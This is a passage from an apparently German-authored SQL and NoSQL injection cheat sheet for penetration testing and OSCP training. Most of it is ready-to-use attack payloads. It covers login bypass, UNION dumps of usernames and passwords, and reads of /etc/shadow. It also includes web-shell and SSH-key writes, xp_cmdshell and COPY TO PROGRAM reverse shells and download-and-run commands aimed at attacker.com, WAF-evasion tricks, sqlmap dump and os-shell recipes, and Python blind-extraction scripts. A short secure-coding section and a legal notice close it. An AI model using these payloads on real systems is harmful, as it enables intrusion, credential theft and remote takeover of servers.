AdMiN' Or '1'='1
aDmIn'--
```

#### Unicode/Encoding
```sql
admin%c2%27 OR 1=1--
admin\u0027 OR 1=1--
```

---

## Data Exfiltration

### 33. Automated Data Dumping

#### Database Enumeration
```sql
-- MySQL - All Databases:
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- All Tables in Current DB:
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- All Columns in Table:
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### Data Extraction
```sql
-- Single Row:
' UNION SELECT NULL,username,password FROM users LIMIT 1--

-- All Rows (MySQL):
' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password),NULL FROM users--

-- With Separator:
' UNION SELECT NULL,GROUP_CONCAT(username,0x7c,password SEPARATOR 0x3b),NULL FROM users--
-- 0x7c = |, 0x3b = ;
-- Result: user1|pass1;user2|pass2;user3|pass3

-- Multiple Columns:
' UNION SELECT NULL,CONCAT(username,0x3a,email,0x3a,password),NULL FROM users--
```

#### Pagination/Offset
```sql
-- MySQL LIMIT OFFSET:
' UNION SELECT NULL,username,password FROM users LIMIT 1 OFFSET 0--   (first row)
' UNION SELECT NULL,username,password FROM users LIMIT 1 OFFSET 1--   (second row)

-- MSSQL TOP:
' UNION SELECT TOP 1 NULL,username,password FROM users--
' UNION SELECT TOP 1 NULL,username,password FROM users WHERE username NOT IN (SELECT TOP 1 username FROM users)--

-- Oracle ROWNUM:
' UNION SELECT NULL,username,password FROM users WHERE ROWNUM=1--
```

### 34. Binary Data Exfiltration

#### Hex Encoding
```sql
-- MySQL:
' UNION SELECT NULL,HEX(password),NULL FROM users--

-- Decode:
echo "68657861646563696d616c" | xxd -r -p
```

#### Base64 Encoding
```sql
-- MySQL:
' UNION SELECT NULL,TO_BASE64(password),NULL FROM users--

-- PostgreSQL (custom function needed)
-- MSSQL (custom function needed)
```

---

## File Operations

### 35. File Read

#### MySQL (LOAD_FILE)
```sql
-- Read /etc/passwd:
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--

-- Hex Encoding Path (WAF Bypass):
' UNION SELECT NULL,LOAD_FILE(0x2f6574632f706173737764),NULL--

-- Common Files:
/etc/passwd
/etc/shadow
/etc/mysql/my.cnf
/var/www/html/config.php
C:\Windows\win.ini
C:\boot.ini
```

#### MSSQL (OPENROWSET / xp_cmdshell)
```sql
-- OPENROWSET:
' UNION SELECT NULL,BulkColumn,NULL FROM OPENROWSET(BULK 'C:\windows\win.ini', SINGLE_CLOB)--

-- xp_cmdshell:
'; EXEC xp_cmdshell 'type C:\windows\win.ini'--
```

#### PostgreSQL (COPY / lo_import)
```sql
-- COPY:
'; CREATE TABLE temp(data text); COPY temp FROM '/etc/passwd'; SELECT * FROM temp--

-- Large Object:
'; SELECT lo_import('/etc/passwd', 12345); SELECT encode(lo_get(12345), 'base64')--
```

#### Oracle (UTL_FILE)
```sql
-- Requires DBA privileges (meist nicht möglich)
```

### 36. File Write

#### MySQL (INTO OUTFILE / DUMPFILE)
```sql
-- Write Web Shell:
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--

-- Write SSH Key:
' UNION SELECT NULL,'ssh-rsa AAAA...',NULL INTO OUTFILE '/root/.ssh/authorized_keys'--

-- DUMPFILE (for binary):
' UNION SELECT NULL,LOAD_FILE('/path/to/binary'),NULL INTO DUMPFILE '/tmp/binary'--

-- Requirements:
-- - FILE privilege
-- - know web root path
-- - write permissions
```

#### MSSQL (xp_cmdshell)
```sql
-- Write File:
'; EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php'--

-- Download and Execute:
'; EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/payload.exe C:\temp\payload.exe'--
'; EXEC xp_cmdshell 'C:\temp\payload.exe'--
```

#### PostgreSQL (COPY TO)
```sql
-- Write File:
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--

-- Requires superuser usually
```

---

## Command Execution

### 37. OS Command Execution

#### MSSQL (xp_cmdshell)
```sql
-- Whoami:
'; EXEC xp_cmdshell 'whoami'--

-- Directory Listing:
'; EXEC xp_cmdshell 'dir C:\'--

-- Reverse Shell:
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'--

-- Netcat:
'; EXEC xp_cmdshell 'nc.exe attacker.com 4444 -e cmd.exe'--
```

#### PostgreSQL (COPY TO PROGRAM)
```sql
-- Whoami:
'; COPY (SELECT '') TO PROGRAM 'id'--

-- Reverse Shell:
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"'--

-- Curl payload:
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.sh | bash'--
```

#### MySQL (UDF - User Defined Function)
```sql
-- Komplex, benötigt:
-- 1. lib_mysqludf_sys.so kompilieren
-- 2. In plugin dir kopieren
-- 3. CREATE FUNCTION

-- Create sys_exec function:
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'

-- Execute:
SELECT sys_exec('id')

-- Meist nicht praktikabel in Pentest (benötigt FILE privilege + plugin dir write)
```

#### Oracle (Java Stored Procedures)
```sql
-- Sehr komplex, benötigt DBA
-- Meist nicht praktikabel
```

---

## WAF Bypass Techniques

### 38. Comment Obfuscation

#### Inline Comments
```sql
-- MySQL:
'/**/OR/**/1=1--
'/**/UNION/**/SELECT/**/NULL--

-- Version specific:
'/*!50000UNION*/SELECT--

-- Nested:
'/*! /*! UNION */ */ SELECT--
```

#### Comment Variations
```sql
-- MySQL:
'#
OR#
1=1#

-- Hash after newline:
'%0A#%0AOR 1=1

-- Mix:
'--+
'--+-
'--+%0A
```

### 39. Case Variations
```sql
-- Normal:
' OR 1=1--

-- Mixed case:
' oR 1=1--
' Or 1=1--
' OR 1=1--

-- Random case:
' uNiOn SeLeCt--
```

### 40. Whitespace Alternatives
```sql
-- Normal:
' OR 1=1--

-- Alternatives:
'/**/OR/**/1=1--
'+OR+1=1--
'||OR||1=1--  (PostgreSQL)

-- Tab:
'%09OR%091=1--

-- Newline:
'%0AOR%0A1=1--

-- Multiple spaces:
'  OR  1=1--
```

### 41. Encoding Bypass

#### URL Encoding
```sql
-- Single encoded:
%27%20OR%201=1--

-- Double encoded:
%2527%2520OR%25201=1--

-- Partial encoding:
'%20OR%201=1--
```

#### Unicode
```sql
-- Unicode quotes:
\u0027 OR 1=1--
%u0027 OR 1=1--

-- Alternative representations:
\x27 OR 1=1--
```

#### Hex Encoding
```sql
-- MySQL:
0x61646d696e  -- 'admin'

-- Usage:
' OR username=0x61646d696e--
```

### 42. Operator Alternatives

#### OR Alternatives
```sql
-- Normal:
' OR 1=1--

-- Alternatives:
' || 1=1--      (PostgreSQL)
' | 1--         (bitwise OR, MySQL)
' OR 1--
' OR 'a'='a'--
' OR ''='--
```

#### AND Alternatives
```sql
-- Normal:
' AND 1=1--

-- Alternatives:
' && 1=1--      (MySQL)
' & 1--         (bitwise AND)
```

#### UNION Alternatives
```sql
-- Normal:
' UNION SELECT--

-- With comments:
'/**/UNION/**/SELECT--
'UNION/**/SELECT--
'/*!UNION*/SELECT--

-- Case variation:
'UnIoN SeLeCt--
```

### 43. Equivalent Expressions
```sql
-- OR 1=1 equivalents:
OR 'a'='a'
OR 1
OR true
OR 2>1
OR 'x'<>'y'
OR 1 IN (1,2,3)

-- Substring equivalents:
SUBSTRING(str,1,1)
MID(str,1,1)
SUBSTR(str,1,1)
```

### 44. Filter-Specific Bypasses

#### Bypass "SELECT"
```sql
-- Normal:
SELECT * FROM users

-- Bypass:
SeLeCt * FROM users
SELECT/**//**/FROM users
SEL/**/ECT * FROM users
%53ELECT * FROM users  -- URL encoded S
```

#### Bypass "UNION"
```sql
-- Normal:
UNION SELECT

-- Bypass:
UnIoN SeLeCt
UNION/**/SELECT
UNI/**/ON/**/SELECT
%55NION SELECT
```

#### Bypass "WHERE"
```sql
-- Normal:
WHERE id=1

-- Alternatives:
HAVING id=1
LIMIT 1 OFFSET 0
```

#### Bypass "="
```sql
-- Normal:
WHERE username='admin'

-- Alternatives:
WHERE username LIKE 'admin'
WHERE username IN ('admin')
WHERE username REGEXP 'admin'
WHERE STRCMP(username,'admin')=0
```

### 45. WAF-Specific Bypasses

#### ModSecurity
```sql
-- Bypass keyword detection:
'/**/UNION/**/SELECT/**/NULL--
'/*!50000UNION*/SELECT--

-- HPP (HTTP Parameter Pollution):
?id=1&id=' UNION SELECT--

-- Tamper scripts (sqlmap):
--tamper=space2comment
--tamper=between
```

#### Cloudflare
```sql
-- JSON smuggling
-- Large payloads
-- Encoding variations
```

---

## sqlmap Automation

### 46. sqlmap Basics

#### Basic Usage
```bash
# URL
sqlmap -u "http://target.com/page.php?id=1"

# POST Data
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"

# Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abcd1234"

# Custom Header
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"
```

#### Request from File (Burp)
```bash
# 1. Capture request in Burp
# 2. Copy to Clipboard -> Save as request.txt
# 3. Mark injection point with *

# request.txt:
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin*&password=test

# Run:
sqlmap -r request.txt

# Specific parameter:
sqlmap -r request.txt -p username
```

### 47. sqlmap Options

#### Database Enumeration
```bash
# Databases:
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Current Database:
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Tables:
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Columns:
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns

# Dump Table:
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# Dump All:
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Search:
sqlmap -u "http://target.com/page.php?id=1" --search -C password
```

#### Advanced Options
```bash
# Specify DBMS:
sqlmap -u "URL" --dbms=MySQL

# Level & Risk:
sqlmap -u "URL" --level=5 --risk=3
# Level 1-5: test thoroughness
# Risk 1-3: dangerous tests (OR-based, UPDATE, etc.)

# Threads:
sqlmap -u "URL" --threads=10

# Technique:
sqlmap -u "URL" --technique=BEUST
# B: Boolean-based blind
# E: Error-based
# U: UNION query
# S: Stacked queries
# T: Time-based blind

# Specific technique only:
sqlmap -u "URL" --technique=U   (only UNION)
```

#### Authentication
```bash
# HTTP Auth:
sqlmap -u "URL" --auth-type=Basic --auth-cred="username:password"

# Form-based:
sqlmap -u "URL" --cookie="session=abc123"

# Maintain session:
sqlmap -u "URL" --cookie="PHPSESSID=abc" --level=2
```

#### Output Options
```bash
# Verbose:
sqlmap -u "URL" -v 3   (0-6)

# Output to file:
sqlmap -u "URL" --output-dir=/path/to/output

# Batch mode (no prompts):
sqlmap -u "URL" --batch

# Flush session:
sqlmap -u "URL" --flush-session
```

### 48. sqlmap Advanced Features

#### OS Shell
```bash
# Get OS Shell (via SQL injection):
sqlmap -u "URL" --os-shell

# Upload shell:
sqlmap -u "URL" --os-cmd="whoami"

# Interactive:
sqlmap -u "URL" --os-shell
> whoami
> dir C:\
```

#### File Operations
```bash
# Read File:
sqlmap -u "URL" --file-read="/etc/passwd"

# Write File:
sqlmap -u "URL" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"
```

#### Tamper Scripts (WAF Bypass)
```bash
# List tamper scripts:
sqlmap --list-tampers

# Use tamper:
sqlmap -u "URL" --tamper=space2comment

# Multiple tampers:
sqlmap -u "URL" --tamper=space2comment,between,randomcase

# Common tampers:
--tamper=space2comment         # Space to /**/
--tamper=between               # AND/OR to NOT BETWEEN
--tamper=randomcase            # Random case
--tamper=charencode            # Character encoding
--tamper=apostrophemask        # ' to %EF%BC%87
--tamper=equaltolike           # = to LIKE
--tamper=space2mysqldash       # Space to -- and newline
```

#### Proxy
```bash
# HTTP Proxy:
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# SOCKS:
sqlmap -u "URL" --proxy="socks5://127.0.0.1:9050"

# Tor:
sqlmap -u "URL" --tor --check-tor
```

### 49. sqlmap Quick Recipes

#### Fast Scan
```bash
sqlmap -u "URL" --batch --random-agent --level=1 --risk=1
```

#### Thorough Scan
```bash
sqlmap -u "URL" --batch --random-agent --level=5 --risk=3 --threads=10
```

#### Dump Everything
```bash
sqlmap -u "URL" --batch --dump-all --exclude-sysdbs
```

#### Behind WAF
```bash
sqlmap -u "URL" --batch --random-agent --tamper=space2comment,between --level=5 --risk=3
```

#### From Burp Request
```bash
sqlmap -r request.txt --batch --random-agent --level=3 --risk=2 -p username
```

---

## Manual Exploitation

### 50. Manual Exploitation Workflow

#### Step 1: Identify Injection Point
```
1. Test all parameters: GET, POST, Cookie, Headers
2. Add special characters: ' " ` -- # /* */
3. Observe errors or behavior changes
```

#### Step 2: Determine Injection Type
```sql
-- Error messages? -> Error-based
-- Different responses (true/false)? -> Boolean-based
-- No visible difference? -> Time-based
```

#### Step 3: Fingerprint Database
```sql
-- MySQL: @@version, database()
-- MSSQL: @@version, db_name()
-- PostgreSQL: version()
-- Oracle: SELECT banner FROM v$version
```

#### Step 4: Extract Data
```sql
-- Find column count (UNION)
-- Find output columns
-- Extract database names
-- Extract table names
-- Extract column names
-- Dump data
```

### 51. Manual Boolean Extraction Script

#### Python Script (Character-by-Character)
```python
import requests
import string

url = "http://target.com/page.php"
charset = string.ascii_lowercase + string.digits + "_"

def check_char(payload):
    r = requests.get(url, params={"id": payload})
    return "Welcome" in r.text  # True condition indicator

# Extract database name
db_name = ""
for position in range(1, 20):
    for char in charset:
        payload = f"1' AND SUBSTRING(database(),{position},1)='{char}'--"
        if check_char(payload):
            db_name += char
            print(f"[+] Database name: {db_name}")
            break
    else:
        break

print(f"[+] Final database name: {db_name}")
```

#### Binary Search Optimization
```python
import requests

url = "http://target.com/page.php"

def check_ascii(position, ascii_val):
    payload = f"1' AND ASCII(SUBSTRING(database(),{position},1))={ascii_val}--"
    r = requests.get(url, params={"id": payload})
    return "Welcome" in r.text

def binary_search_char(position):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"1' AND ASCII(SUBSTRING(database(),{position},1))>{mid}--"
        r = requests.get(url, params={"id": payload})
        if "Welcome" in r.text:
            low = mid + 1
        else:
            high = mid - 1
    return chr(high + 1)

# Extract database name
db_name = ""
for i in range(1, 20):
    char = binary_search_char(i)
    if ord(char) == 32:  # Space means end
        break
    db_name += char
    print(f"[+] Database: {db_name}")

print(f"[+] Final: {db_name}")
```

### 52. Manual Time-Based Extraction

#### Python Script
```python
import requests
import time

url = "http://target.com/page.php"

def time_check(payload, delay=5):
    start = time.time()
    r = requests.get(url, params={"id": payload})
    elapsed = time.time() - start
    return elapsed >= delay

# Extract database name
db_name = ""
for position in range(1, 20):
    for char_code in range(97, 123):  # a-z
        char = chr(char_code)
        payload = f"1' AND IF(SUBSTRING(database(),{position},1)='{char}',SLEEP(5),0)--"
        if time_check(payload):
            db_name += char
            print(f"[+] Database: {db_name}")
            break
    else:
        break

print(f"[+] Final: {db_name}")
```

---

## NoSQL Injection

### 53. MongoDB Injection

#### Authentication Bypass
```javascript
// Normal query:
db.users.find({username: 'admin', password: 'test'})

// Injection (JSON):
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// URL Encoded:
username[$ne]=&password[$ne]=
username[$regex]=^adm&password[$ne]=

// Login bypass:
username=admin&password[$ne]=test
```

#### Operator Injection
```javascript
// $ne (not equal):
{"username": "admin", "password": {"$ne": "wrongpass"}}

// $gt (greater than):
{"username": {"$gt": ""}}

// $regex (regex):
{"username": {"$regex": "^adm"}}

// $where (JavaScript):
{"$where": "this.username == 'admin' || '1'=='1'"}

// $or:
{"$or": [{"username": "admin"}, {"username": "user"}]}
```

#### Data Extraction
```javascript
// Regex-based extraction (character by character):
{"username": {"$regex": "^a"}}   // starts with 'a'?
{"username": {"$regex": "^ad"}}  // starts with 'ad'?
{"username": {"$regex": "^adm"}} // starts with 'adm'?
// Continue until full username extracted
```

### 54. CouchDB Injection
```javascript
// Similar to MongoDB
// JSON-based queries
```

### 55. NoSQL Blind Injection

#### Time-based (MongoDB)
```javascript
// $where with sleep:
{"$where": "sleep(5000)"}

// Conditional sleep:
{"$where": "if (this.username == 'admin') { sleep(5000); }"}
```

#### Boolean-based
```javascript
// True:
{"username": {"$regex": "^a.*"}, "password": {"$ne": ""}}

// False:
{"username": {"$regex": "^z.*"}, "password": {"$ne": ""}}

// Extract character by character via regex
```

---

## Prevention & Remediation

### 56. Secure Coding Practices

#### Prepared Statements (Recommended!)
```php
// PHP PDO:
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);

// Named parameters:
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $username]);
```

#### Parameterized Queries
```python
# Python:
cursor.execute("SELECT * FROM users WHERE id = %s", (id,))
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

```java
// Java:
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, id);
ResultSet rs = stmt.executeQuery();
```

```csharp
// C#:
SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE id = @id", connection);
cmd.Parameters.AddWithValue("@id", id);
SqlDataReader reader = cmd.ExecuteReader();
```

#### Input Validation
```php
// Whitelist validation:
if (!preg_match('/^[0-9]+$/', $id)) {
    die("Invalid ID");
}

// Type casting:
$id = (int)$_GET['id'];

// Whitelist for specific values:
$allowed = ['asc', 'desc'];
if (!in_array($order, $allowed)) {
    die("Invalid order");
}
```

#### Escaping (NOT recommended, use prepared statements!)
```php
// MySQL:
$username = mysqli_real_escape_string($conn, $_POST['username']);

// BUT: Prepared statements are better!
```

### 57. Defense in Depth

#### Least Privilege
```sql
-- Create limited user:
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';

-- Grant only necessary permissions:
GRANT SELECT, INSERT, UPDATE ON database.users TO 'webapp'@'localhost';

-- NO:
GRANT ALL PRIVILEGES  -- Too much!
GRANT FILE            -- Allows LOAD_FILE/INTO OUTFILE
```

#### Disable Dangerous Features
```sql
-- MySQL: Disable LOAD_FILE and INTO OUTFILE
-- Remove FILE privilege from users

-- MSSQL: Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0
RECONFIGURE

-- PostgreSQL: Remove SUPERUSER from app user
```

#### WAF (Web Application Firewall)
```
- ModSecurity
- Cloudflare WAF
- AWS WAF
- Imperva
```

#### Error Handling
```php
// DON'T show SQL errors:
// mysqli_error($conn)  // BAD

// Generic error:
die("An error occurred. Please try again.");

// Log errors server-side only
error_log("SQL Error: " . mysqli_error($conn));
```

---

## Cheat Sheet Quick Reference

### SQL Injection Detection
```sql
'               # Error?
"               # Error?
`               # Error?
' OR '1'='1     # Different behavior?
' AND SLEEP(5)--  # Delay?
```

### UNION Injection (MySQL)
```sql
# 1. Find columns:
' ORDER BY 1--  (ok)
' ORDER BY 5--  (error -> 4 columns)

# 2. Find output:
' UNION SELECT 1,2,3,4--

# 3. Extract:
' UNION SELECT NULL,database(),NULL,NULL--
' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,username,password,NULL FROM users--
```

### Authentication Bypass
```sql
admin'--
admin' OR '1'='1
' OR 1=1--
admin' OR 1=1--
' UNION SELECT 'admin','5f4dcc3b5aa765d61d8327deb882cf99'--
```

### sqlmap Quick Commands
```bash
# Basic:
sqlmap -u "URL?id=1"

# From Burp:
sqlmap -r request.txt -p parameter

# Dump all:
sqlmap -u "URL?id=1" --dump-all --batch

# OS Shell:
sqlmap -u "URL?id=1" --os-shell

# WAF Bypass:
sqlmap -u "URL?id=1" --tamper=space2comment,between --random-agent
```

### Database Fingerprinting
```sql
# MySQL:
@@version, database(), user()

# MSSQL:
@@version, db_name(), user_name()

# PostgreSQL:
version(), current_database(), user

# Oracle:
SELECT banner FROM v$version, SELECT user FROM dual
```

---

## Wichtige Hinweise

- **Prepared Statements**: IMMER verwenden - beste Defense
- **Error Messages**: In Production verstecken
- **Least Privilege**: DB User nur minimale Rechte
- **Input Validation**: Whitelist approach
- **WAF**: Zusätzliche Schutzschicht, aber kein Ersatz für sichere Coding
- **Logging**: SQL Injections loggen für Incident Response
- **sqlmap**: Powerful aber laut - Manual exploitation oft stealthier
- **Time-based**: Langsam aber zuverlässig bei Blind SQLi
- **WAF Bypass**: Encoding, case variation, comments

---

## Rechtliche Hinweise

Diese Methoden dürfen NUR verwendet werden für:
- Autorisierte Penetrationstests mit schriftlicher Genehmigung
- CTF-Wettbewerbe und Security Challenges
- Forensische Analysen auf eigenen Systemen
- Sicherheitsforschung in kontrollierten Umgebungen
- Defensive Security und Incident Response

Unbefugte Nutzung verstößt gegen CFAA (USA), Computer Misuse Act (UK), StGB §202a-c (DE) und ähnliche Gesetze weltweit.

---

**Erstellt**: 2025-10-30
**System**: Web Applications
**Kontext**: Autorisierter Penetrationstest / OSCP Training
